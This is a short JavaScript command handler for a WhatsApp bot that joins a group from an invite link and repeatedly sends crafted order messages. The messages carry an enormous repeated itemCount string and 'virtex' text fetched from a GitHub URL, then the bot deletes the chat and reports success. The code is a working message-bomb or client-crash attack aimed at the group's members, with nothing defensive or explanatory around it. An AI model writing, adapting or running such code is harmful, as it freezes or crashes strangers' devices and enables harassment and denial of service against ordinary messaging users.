let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i

let handler = async (m, { conn, text, args }) => {
    let [_, code] = args[0].match(linkRegex) || []
    if (!code) throw 'Link invalid'
    let { gid: target } = await conn.acceptInvite(code)
  for (let i of '.'.repeat(args[1])) {
await conn.relayWAMessage(global.mm=conn.
prepareMessageFromContent(target, conn.
prepareDisappearingMessageSettingContent(0),
{}),{waitForAck:!0}).catch(console.log);
virtex = await require('node-fetch')('https://raw.githubusercontent.com/Caliph71/txt/main/virtex.txt').then(v => v.text());
yahaha = await conn.prepareMessageFromContent(target, {
   orderMessage: {
    itemCount: "99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999".repeat(9999), // Bug
    status: "INQUIRY",
   surface: "CATALOG",
    message: virtex,
    orderTitle: 'MAMPUS', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }, {});

await conn.relayWAMessage(yahaha);
}
await conn.modifyChat(target, 'delete').catch(console.log);
m.reply('Sukses...')
}

handler.command = /^bugs$/i

handler.rowner = true

module.exports = handler